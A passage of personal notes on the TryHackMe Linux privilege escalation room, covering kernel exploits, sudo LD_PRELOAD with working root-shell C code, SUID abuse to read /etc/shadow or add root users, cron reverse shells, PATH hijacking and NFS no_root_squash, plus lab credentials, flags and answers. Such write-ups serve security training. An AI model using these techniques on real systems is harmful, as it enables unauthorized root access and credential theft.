+default via 10.10.0.1 dev eth0
+10.10.0.0/16 dev eth0  proto kernel  scope link  src 10.10.202.224
+169.254.0.0/16 dev eth0  scope link  metric 1000</p>
+<p>$ netstat -at
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 <em>:ssh                   <em>:</em>                     LISTEN
+tcp        0      0 localhost:ipp           <em>:</em>                     LISTEN
+tcp        0      0 ip-10-10-202-224.eu:ssh ip-10-13-27-214.e:44060 ESTABLISHED
+tcp6       0      0 [::]:ssh                [::]:</em>                  LISTEN
+tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN
+tcp6       1      0 ip6-localhost:53629     ip6-localhost:ipp       CLOSE_WAIT</p>
+<p>$ netstat -l
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 <em>:ssh                   <em>:</em>                     LISTEN
+tcp        0      0 localhost:ipp           <em>:</em>                     LISTEN
+tcp6       0      0 [::]:ssh                [::]:</em>                  LISTEN
+tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN
+udp        0      0 *:29177                 <em>:</em>
+udp        0      0 <em>:bootpc                <em>:</em>
+udp        0      0 <em>:ipp                   <em>:</em>
+udp        0      0 <em>:mdns                  <em>:</em>
+udp        0      0 <em>:40317                 <em>:</em>
+udp6       0      0 [::]:45626              [::]:</em>
+udp6       0      0 [::]:mdns               [::]:</em>
+udp6       0      0 [::]:13550              [::]:</em>
+Active UNIX domain sockets (only servers)
+Proto RefCnt Flags       Type       State         I-Node   Path
+unix  2      [ ACC ]     STREAM     LISTENING     11265    /run/user/112/pulse/native
+unix  2      [ ACC ]     STREAM     LISTENING     9882     /tmp/.X11-unix/X0
+unix  2      [ ACC ]     STREAM     LISTENING     9881     @/tmp/.X11-unix/X0
+unix  2      [ ACC ]     STREAM     LISTENING     10720    @/tmp/dbus-RxgAdsUWl5
+unix  2      [ ACC ]     STREAM     LISTENING     9862     /var/lib/amazon/ssm/ipc/termination
+unix  2      [ ACC ]     SEQPACKET  LISTENING     7496     /run/udev/control
+unix  2      [ ACC ]     STREAM     LISTENING     7112     @/com/ubuntu/upstart
+unix  2      [ ACC ]     STREAM     LISTENING     9580     /var/run/acpid.socket
+unix  2      [ ACC ]     STREAM     LISTENING     10911    @/com/ubuntu/upstart-session/112/1350
+unix  2      [ ACC ]     STREAM     LISTENING     7807     /var/run/avahi-daemon/socket
+unix  2      [ ACC ]     STREAM     LISTENING     9861     /var/lib/amazon/ssm/ipc/health
+unix  2      [ ACC ]     STREAM     LISTENING     7602     /var/run/dbus/system_bus_socket
+unix  2      [ ACC ]     STREAM     LISTENING     7876     /var/run/sdp
+unix  2      [ ACC ]     STREAM     LISTENING     10672    @/tmp/dbus-Zk3K27Qtrs
+unix  2      [ ACC ]     STREAM     LISTENING     10491    /var/run/cups/cups.sock
+$ netstat -lt
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 <em>:ssh                   <em>:</em>                     LISTEN
+tcp        0      0 localhost:ipp           <em>:</em>                     LISTEN
+tcp6       0      0 [::]:ssh                [::]:</em>                  LISTEN
+tcp6       0      0 ip6-localhost:ipp       [::]:</em>                  LISTEN
+$ netstat -au
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+udp        0      0 *:29177                 <em>:</em>
+udp        0      0 *:bootpc                <em>:</em>
+udp        0      0 <em>:ipp                   <em>:</em>
+udp        0      0 <em>:mdns                  <em>:</em>
+udp        0      0 <em>:40317                 <em>:</em>
+udp6       0      0 [::]:45626              [::]:</em>
+udp6       0      0 [::]:mdns               [::]:</em>
+udp6       0      0 [::]:13550              [::]:</em></p>
+<p>$ netstat -s
+Ip:
+1166 total packets received
+0 forwarded
+0 incoming packets discarded
+1164 incoming packets delivered
+855 requests sent out
+Icmp:
+0 ICMP messages received
+0 input ICMP message failed.
+ICMP input histogram:
+0 ICMP messages sent
+0 ICMP messages failed
+ICMP output histogram:
+Tcp:
+82 active connections openings
+3 passive connection openings
+52 failed connection attempts
+0 connection resets received
+1 connections established
+1175 segments received
+845 segments send out
+24 segments retransmited
+0 bad segments received.
+52 resets sent
+Udp:
+62 packets received
+0 packets to unknown port received.
+0 packet receive errors
+94 packets sent
+UdpLite:
+TcpExt:
+4 TCP sockets finished time wait in fast timer
+5 delayed acks sent
+Quick ack mode was activated 1 times
+22 packet headers predicted
+76 acknowledgments not containing data payload received
+541 predicted acknowledgments
+6 other TCP timeouts
+1 DSACKs sent for old packets
+TCPRcvCoalesce: 3
+IpExt:
+InNoRoutes: 2
+InMcastPkts: 28
+OutMcastPkts: 30
+InOctets: 90473
+OutOctets: 189260
+InMcastOctets: 3855
+OutMcastOctets: 3935
+InNoECTPkts: 1167</p>
+<p>$ netstat -tp
+(No info could be read for &ldquo;-p&rdquo;: geteuid()=1001 but you should be root.)
+Active Internet connections (w/o servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 ip-10-10-202-224.eu:ssh ip-10-13-27-214.e:44060 ESTABLISHED -
+tcp6       1      0 ip6-localhost:53629     ip6-localhost:ipp       CLOSE_WAIT  -</p>
+<p>$ netstat -ltp
+(No info could be read for &ldquo;-p&rdquo;: geteuid()=1001 but you should be root.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 <em>:ssh                   <em>:</em>                     LISTEN      -
+tcp        0      0 localhost:ipp           <em>:</em>                     LISTEN      -
+tcp6       0      0 [::]:ssh                [::]:</em>                  LISTEN      -
+tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN      -</p>
+<p>[jmk@arch THM]$ netstat -i
+Kernel Interface table
+Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
+enp4s0           1500 68970011      0    327 0      29465019      0      0      0 BMRU
+lo              65536      506      0      0 0           506      0      0      0 LRU
+tun0             1500      679      0      0 0          1153      0      0      0 MOPRU</p>
+<h2 id="task-4-automated-enumeration-tools">Task 4 Automated Enumeration Tools</h2>
+<p>Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.</p>
+<p>The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.</p>
+<ul>
+<li><strong>LinPeas</strong>: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li>
+<li><strong>LinEnum:</strong> <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><a href="https://github.com/rebootuser/LinEnum"></a></li>
+<li><strong>LES (Linux Exploit Suggester):</strong> <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
+<li><strong>Linux Smart Enumeration:</strong> <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
+<li><strong>Linux Priv Checker:</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li>
+</ul>
+<p>Answer the questions below</p>
+<p>Install and try a few automated enumeration tools on your local Linux distribution</p>
+<h2 id="task-5-privilege-escalation-kernel-exploits">Task 5 Privilege Escalation: Kernel Exploits</h2>
+<p><strong>Note: Launch the target machine attached to this task to follow along.</strong></p>
+<p><strong>You can launch the target machine and access it directly from your browser.</strong></p>
+<p>**Alternatively, you can access it over SSH with the low-privilege user credentials below:<br>
+**</p>
+<p><strong>Username: karen</strong></p>
+<p><strong>Password: Password1</strong></p>
+<p>Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.</p>
+<p>Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.</p>
+<p>The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.</p>
+<p>The Kernel exploit methodology is simple;</p>
+<ol>
+<li>Identify the kernel version</li>
+<li>Search and find an exploit code for the kernel version of the target system</li>
+<li>Run the exploit</li>
+</ol>
+<p>Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.</p>
+<p><strong>Research sources:</strong></p>
+<ol>
+<li>Based on your findings, you can use Google to search for an existing exploit code.</li>
+<li>Sources such as <a href="https://www.linuxkernelcves.com/cves">https://www.linuxkernelcves.com/cves</a> can also be useful.</li>
+<li>Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).</li>
+</ol>
+<p><strong>Hints/Notes:</strong></p>
+<ol>
+<li>Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit</li>
+<li>Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.</li>
+<li>Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.</li>
+<li>You can transfer the exploit code from your machine to the target system using the <code>SimpleHTTPServer</code> Python module and <code>wget</code> respectively.</li>
+</ol>
+<p>Answer the questions below</p>
+<p>find and use the appropriate kernel exploit to gain root privileges on the target system.</p>
+<p>What is the content of the flag1.txt file?
+A: THM-28392872729920</p>
+<h2 id="task-6-privilege-escalation-sudo">Task 6 Privilege Escalation: Sudo</h2>
+<p><strong>Note: Launch the target machine attached to this task to follow along.</strong></p>
+<p><strong>You can launch the target machine and access it directly from your browser.</strong></p>
+<p>**Alternatively, you can access it over SSH with the low-privilege user credentials below:<br>
+**</p>
+<p><strong>Username: karen</strong></p>
+<p><strong>Password: Password1</strong></p>
+<p>The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.</p>
+<p>Any user can check its current situation related to root privileges using the <code>sudo -l</code> command.</p>
+<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.</p>
+<p><strong>Leverage application functions</strong></p>
+<p>Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.</p>
+<p>In this case, we can use a &ldquo;hack&rdquo; to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (<code>-f</code> : specify an alternate ServerConfigFile).</p>
+<p><img src="https://i.imgur.com/rNpbbL8.png" alt=""></p>
+<p>Loading the <code>/etc/shadow</code> file using this option will result in an error message that includes the first line of the <code>/etc/shadow</code> file.</p>
+<p><strong>Leverage LD_PRELOAD</strong></p>
+<p>On some systems, you may see the LD_PRELOAD environment option.</p>
+<p><img src="https://i.imgur.com/gGstS69.png" alt=""></p>
+<p>LD_PRELOAD is a function that allows any program to use shared libraries. This <a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">blog post</a> will give you an idea about the capabilities of LD_PRELOAD. If the &ldquo;env_keep&rdquo; option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.</p>
+<p>The steps of this privilege escalation vector can be summarized as follows;</p>
+<ol>
+<li>Check for LD_PRELOAD (with the env_keep option)</li>
+<li>Write a simple C code compiled as a share object (.so extension) file</li>
+<li>Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file</li>
+</ol>
+<p>The C code will simply spawn a root shell and can be written as follows;</p>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;sys/types.h&gt;<br>
+#include &lt;stdlib.h&gt;</p>
+<p>void _init() {<br>
+unsetenv(&ldquo;LD_PRELOAD&rdquo;);<br>
+setgid(0);<br>
+setuid(0);<br>
+system(&quot;/bin/bash&quot;);<br>
+}</p>
+<p>We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;</p>
+<p><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>
+<p><img src="https://i.imgur.com/HxbszMW.png" alt=""></p>
+<p>We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.</p>
+<p>We need to run the program by specifying the LD_PRELOAD option, as follows;</p>
+<p><code>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</code></p>
+<p>This will result in a shell spawn with root privileges.</p>
+<p><img src="https://i.imgur.com/1YwARyZ.png" alt=""></p>
+<p>Answer the questions below</p>
+<p>How many programs can the user &ldquo;karen&rdquo; run on the target system with sudo rights?<br>
+A: 3
+What is the content of the flag2.txt file?<br>
+A: THM-402028394
+How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?<br>
+A: sudo nmap &ndash;interactive
+What is the hash of frank&rsquo;s password?
+A: &ldquo;$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1 &quot;</p>
+<h2 id="task-7-privilege-escalation-suid">Task 7 Privilege Escalation: SUID</h2>
+<p><strong>Note: Launch the target machine attached to this task to follow along.</strong></p>
+<p><strong>You can launch the target machine and access it directly from your browser.</strong></p>
+<p>**Alternatively, you can access it over SSH with the low-privilege user credentials below:<br>
+**</p>
+<p><strong>Username: karen</strong></p>
+<p><strong>Password: Password1</strong></p>
+<p>Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.</p>
+<p>You will notice these files have an “s” bit set showing their special permission level.</p>
+<p><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code> will list files that have SUID or SGID bits set.</p>
+<p><img src="https://i.imgur.com/fJEeZ4m.png" alt=""></p>
+<p>A good practice would be to compare executables on this list with GTFOBins (<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a>). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list <a href="https://gtfobins.github.io/#+suid">https://gtfobins.github.io/#+suid</a>).</p>
+<p>The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.</p>
+<p><img src="https://i.imgur.com/rSRTn5v.png" alt=""></p>
+<p>The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the <code>/etc/shadow</code> file or adding our user to <code>/etc/passwd</code>.</p>
+<p>Below are simple steps using both vectors.</p>
+<p>reading the <code>/etc/shadow</code> file</p>
+<p>We see that the nano text editor has the SUID bit set by running the <code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code> command.</p>
+<p><code>nano /etc/shadow</code> will print the contents of the <code>/etc/shadow</code> file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the <code>/etc/shadow</code> and <code>/etc/passwd</code> files.</p>
+<p><img src="https://i.imgur.com/DAWxbJD.png" alt=""></p>
+<p>The unshadow tool’s usage can be seen below;<br>
+<code>unshadow passwd.txt shadow.txt &gt; passwords.txt</code></p>
+<p><img src="https://i.imgur.com/6cHBAr1.png" alt=""></p>
+<p>With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit <a href="https://tryhackme.com/room/johntheripper0">https://tryhackme.com/room/johntheripper0</a></p>
+<p>The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:</p>
+<p>We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.</p>
+<p><img src="https://i.imgur.com/bkOGaHY.png" alt=""></p>
+<p>We will then add this password with a username to the <code>/etc/passwd</code> file.</p>
+<p><img src="https://i.imgur.com/huGoEtj.png" alt=""></p>
+<p>Once our user is added (please note how <code>root:/bin/bash</code> was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.</p>
+<p><img src="https://i.imgur.com/HZcWGhi.png" alt=""></p>
+<p>Answer the questions below</p>
+<p>Which user shares the name of a great comic book writer?
+A: gerryconway
+What is the password of user2?
+A: Password1
+What is the content of the flag3.txt file?
+A: THM-3847834</p>
+<h2 id="task-8-privilege-escalation-capabilities">Task 8 Privilege Escalation: Capabilities</h2>
+<p><strong>Note: Launch the target machine attached to this task to follow along.</strong></p>
+<p><strong>You can launch the target machine and access it directly from your browser.</strong></p>
+<p>**Alternatively, you can access it over SSH with the low-privilege user credentials below:<br>
+**</p>
+<p><strong>Username: karen</strong></p>
+<p><strong>Password: Password1</strong></p>
+<p>Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.<br>
+The capabilities man page provides detailed information on its usage and options.</p>
+<p>We can use the <code>getcap</code> tool to list enabled capabilities.</p>
+<p><img src="https://i.imgur.com/Q6XYr0p.png" alt=""></p>
+<p>When run as an unprivileged user, <code>getcap -r /</code> will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.</p>
+<p>Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.</p>
+<p><img src="https://i.imgur.com/6csoabB.png" alt=""></p>
+<p>GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.</p>
+<p>We notice that vim can be used with the following command and payload:</p>
+<p><img src="https://i.imgur.com/nlpCMWj.png" alt=""></p>
+<p>This will launch a root shell as seen below;</p>
+<p><img src="https://i.imgur.com/jCjvgo3.png" alt=""></p>
+<p>Answer the questions below</p>
+<p>Complete the task described above on the target system</p>
+<p>How many binaries have set capabilities?
+A: 6
+What other binary can be used through its capabilities?
+A: view
+What is the content of the flag4.txt file?
+A: THM-9349843</p>
+<h2 id="task-9-privilege-escalation-cron-jobs">Task 9 Privilege Escalation: Cron Jobs</h2>
+<p><strong>Note: Launch the target machine attached to this task to follow along.</strong></p>
+<p><strong>You can launch the target machine and access it directly from your browser.</strong></p>
+<p>**Alternatively, you can access it over SSH with the low-privilege user credentials below:<br>
+**</p>
+<p><strong>Username: karen</strong></p>
+<p><strong>Password: Password1</strong></p>
+<p>Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.<br>
+The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.</p>
+<p>Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.</p>
+<p>Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.</p>
+<p>Any user can read the file keeping system-wide cron jobs under <code>/etc/crontab</code></p>
+<p>While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.<br>
+<img src="https://i.imgur.com/fwqPuHN.png" alt=""></p>
+<p>You can see the <code>backup.sh</code> script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.</p>
+<p><img src="https://i.imgur.com/qlDj93R.png" alt=""></p>
+<p>As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.</p>
+<p>The script will use the tools available on the target system to launch a reverse shell.<br>
+Two points to note;</p>
+<ol>
+<li>The command syntax will vary depending on the available tools. (e.g. <code>nc</code> will probably not support the <code>-e</code> option you may have seen used in other cases)</li>
+<li>We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.</li>
+</ol>
+<p>The file should look like this;</p>
+<p><img src="https://i.imgur.com/579yg6H.png" alt=""></p>
+<p>We will now run a listener on our attacking machine to receive the incoming connection.</p>
+<p><img src="https://i.imgur.com/xwYXfY1.png" alt=""></p>
+<p>Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:</p>
+<ol>
+<li>
+<p>System administrators need to run a script at regular intervals.</p>
+</li>
+<li>
+<p>They create a cron job to do this</p>
+</li>
+<li>
+<p>After a while, the script becomes useless, and they delete it</p>
+</li>
+<li>
+<p>They do not clean the relevant cron job</p>
+</li>
+</ol>
+<p>This change management issue leads to a potential exploit leveraging cron jobs.</p>
+<p><img src="https://i.imgur.com/SovymJL.png" alt=""></p>
+<p>The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.<br>
+If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.</p>
+<p>The file on the target system should look familiar:</p>
+<p><img src="https://i.imgur.com/SHknR87.png" alt=""></p>
+<p>The incoming reverse shell connection has root privileges:</p>
+<p><img src="https://i.imgur.com/EBCue17.png" alt=""></p>
+<p>In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.</p>
+<p>Answer the questions below</p>
+<p>How many user-defined cron jobs can you see on the target system?<br>
+A: 4
+What is the content of the flag5.txt file?
+A: THM-383000283
+What is Matt&rsquo;s password?
+A: 123456</p>
+<h2 id="task-10-privilege-escalation-path">Task 10 Privilege Escalation: PATH</h2>
+<p><strong>Note: Launch the target machine attached to this task to follow along.</strong></p>
+<p><strong>You can launch the target machine and access it directly from your browser.</strong></p>
+<p>**Alternatively, you can access it over SSH with the low-privilege user credentials below:<br>
+**</p>
+<p><strong>Username: karen</strong></p>
+<p><strong>Password: Password1</strong></p>
+<p>If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).</p>
+<p>Typically the PATH will look like this:</p>
+<p><img src="https://i.imgur.com/ch2Z4zp.png" alt=""></p>
+<p>If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.</p>
+<ol>
+<li>What folders are located under $PATH</li>
+<li>Does your current user have write privileges for any of these folders?</li>
+<li>Can you modify $PATH?</li>
+<li>Is there a script/application you can start that will be affected by this vulnerability?</li>
+</ol>
+<p>For demo purposes, we will use the script below:</p>
+<p><img src="https://i.imgur.com/qX7m2Jq.png" alt=""></p>
+<p>This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.</p>
+<p>We compile this into an executable and set the SUID bit.</p>
+<p><img src="https://i.imgur.com/A6QQ65I.png" alt=""></p>
+<p>Our user now has access to the “path” script with SUID bit set.</p>
+<p><img src="https://i.imgur.com/Af1RpuY.png" alt=""></p>
+<p>Once executed “path” will look for an executable named “thm” inside folders listed under PATH.</p>
+<p>If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege</p>
+<p>A simple search for writable folders can done using the “<code>find / -writable 2&gt;/dev/null</code>” command. The output of this command can be cleaned using a simple cut and sort sequence.</p>
+<p><img src="https://i.imgur.com/7UekB3t.png" alt=""></p>
+<p>Some CTF scenarios can present different folders but a regular system would output something like we see above.</p>
+<p>Comparing this with PATH will help us find folders we could use.</p>
+<p><img src="https://i.imgur.com/67mdmmG.png" alt=""></p>
+<p>We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.</p>
+<p><img src="https://i.imgur.com/Y3pDsrL.png" alt=""></p>
+<p>An alternative could be the command below.</p>
+<p><code>find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</code></p>
+<p>We have added “grep -v proc” to get rid of the many results related to running processes.</p>
+<p>Unfortunately, subfolders under /usr are not writable</p>
+<p>The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “<code>export PATH=/tmp:$PATH</code>” command accomplishes this.</p>
+<p><img src="https://i.imgur.com/u1PM8ZD.png" alt=""></p>
+<p>At this point the path script will also look under the /tmp folder for an executable named “thm”.</p>
+<p>Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.</p>
+<p><img src="https://i.imgur.com/7UdrEnd.png" alt=""></p>
+<p>We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.</p>
+<p><img src="https://i.imgur.com/MlBJ8kb.png" alt=""></p>
+<p>Answer the questions below</p>
+<p>What is the odd folder you have write access for?
+A: /home/murdoch
+Exploit the $PATH vulnerability to read the content of the flag6.txt file.<br>
+A:
+What is the content of the flag6.txt file?
+A: THM-736628929</p>
+<h2 id="task-11-privilege-escalation-nfs">Task 11 Privilege Escalation: NFS</h2>
+<p><strong>Note: Launch the target machine attached to this task to follow along.</strong></p>
+<p><strong>You can launch the target machine and access it directly from your browser.</strong></p>
+<p>**Alternatively, you can access it over SSH with the low-privilege user credentials below:<br>
+**</p>
+<p><strong>Username: karen</strong></p>
+<p><strong>Password: Password1</strong></p>
+<p>Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.</p>
+<p>Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.</p>
+<p>NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.</p>
+<p><img src="https://i.imgur.com/irDQTze.png" alt=""></p>
+<p>The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.</p>
+<p>We will start by enumerating mountable shares from our attacking machine.</p>
+<p><img src="https://i.imgur.com/CmXPDcv.png" alt=""></p>
+<p>We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.</p>
+<p><img src="https://i.imgur.com/DwAB1qs.png" alt=""></p>
+<p>As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.</p>
+<p><img src="https://i.imgur.com/nWKpFkK.png" alt=""></p>
+<p>Once we compile the code we will set the SUID bit.</p>
+<p><img src="https://i.imgur.com/rkZOOjZ.png" alt=""></p>
+<p>You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).</p>
+<p><img src="https://i.imgur.com/U7IjT38.png" alt=""></p>
+<p>Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.</p>
+<p>Answer the questions below</p>
+<p>How many mountable shares can you identify on the target system?<br>
+A: 3
+How many shares have the &ldquo;no_root_squash&rdquo; option enabled?<br>
+A: 3
+Gain a root shell on the target system</p>
+<p>What is the content of the flag7.txt file?
+A: THM-89384012</p>
+<h2 id="task-12-capstone-challenge">Task 12 Capstone Challenge</h2>
+<p>By now you have a fairly good understanding of the main privilege escalation vectors on Linux and this challenge should be fairly easy.</p>
+<p>You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.<br>
+We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.</p>
+<p>Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.</p>
+<p>You can access the target machine over your browser or use the SSH credentials below.</p>
+<ul>
+<li>Username: leonard</li>
+<li>Password: Penny123</li>
+</ul>
+<p>Answer the questions below</p>
+<p>What is the content of the flag1.txt file?
+A: THM-42828719920544
+What is the content of the flag2.txt file?<br>
+A: THM-168824782390238</p>
+<p>Created by <img src="https://tryhackme-images.s3.amazonaws.com/user-avatars/af7feb2c43a2c7d5f111b98ccbd15048.png" alt=""> <a href="https://tryhackme.com/p/tryhackme">tryhackme</a></p>
+<p>This is a <strong>free</strong> room, which means anyone can deploy virtual machines in the room (without being subscribed)! 17035 users are in here and this room is 238 days old.</p>
+<h4 id="notes-from-task-12">Notes from task 12</h4>
+<p>[leonard@ip-10-10-209-223 ~]$ cat /proc/version
+Linux version 3.10.0-1160.el7.x86_64 (<a href="mailto:mockbuild@kbuilder.bsys.centos.org">mockbuild@kbuilder.bsys.centos.org</a>) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020</p>
+<p>[leonard@ip-10-10-209-223 ~]$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+[leonard@ip-10-10-209-223 ~]$ cat /etc/passwd | grep home
+leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
+missy:x:1001:1001::/home/missy:/bin/bash</p>
+<p>[leonard@ip-10-10-209-223 ~]$ cat /etc/shadow
